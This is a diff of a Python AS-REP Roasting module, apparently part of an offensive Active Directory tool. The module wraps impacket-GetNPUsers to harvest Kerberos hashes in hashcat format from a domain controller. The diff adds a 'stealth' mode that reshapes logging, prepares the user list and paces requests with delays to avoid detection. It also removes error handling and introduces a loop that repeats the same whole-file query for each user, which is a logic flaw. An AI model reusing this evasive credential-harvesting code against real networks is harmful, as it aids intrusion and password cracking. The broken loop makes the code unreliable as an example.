@@ -1,17 +1,11 @@
-"""
-asrep.py — AS-REP Roasting module
-
-Wraps the 'impacket-GetNPUsers' binary via subprocess instead of importing
-GetNPUsers.py directly. This avoids version mismatches between a locally
-copied script and the installed impacket library.
-"""
-
+#!/usr/bin/env python3
 import os
 import shutil
 import subprocess
 import logging
 
 from .models import ADUser
+from . import stealth as stealth_mod
 
 logger = logging.getLogger(__name__)
 
@@ -134,21 +128,24 @@ def process_users(
     domain: str,
     dc_ip: str,
     users_file: str,
-    output_format: str = "hashcat"
+    output_format: str = "hashcat",
+    stealth_level: int = None
 ) -> None:
-    """
-    Full pipeline: run impacket-GetNPUsers, then parse and hydrate the
-    ADUser list with roastable status and hash values.
-    """
-    logger.info(f"[*] Starting AS-REP roasting enumeration against {domain} ({dc_ip})")
 
-    success = run_getnpusers(domain, dc_ip, users_file, output_format)
+    profile = stealth_mod.get_profile(stealth_level) if stealth_level else {}
 
-    if not success:
-        logger.error("[-] Enumeration failed, marking all users as not roastable")
-        for user in users:
-            user.roastable = False
-        return
+    if profile:
+        stealth_mod.configure_logging(profile)
+        logger.info(f"[~] Stealth mode ENABLED — level {stealth_level}")
+        users = stealth_mod.prepare_users(users, profile)
+
+    timeout = profile.get("timeout", 30)
+
+    for user in users:
+        # Requeete individuelle par user
+        success = run_getnpusers(domain, dc_ip, users_file, output_format, timeout=timeout)
+        if profile:
+            stealth_mod.apply_delay(profile)
 
     parse_results(users)
     logger.info("[+] Enumeration complete")
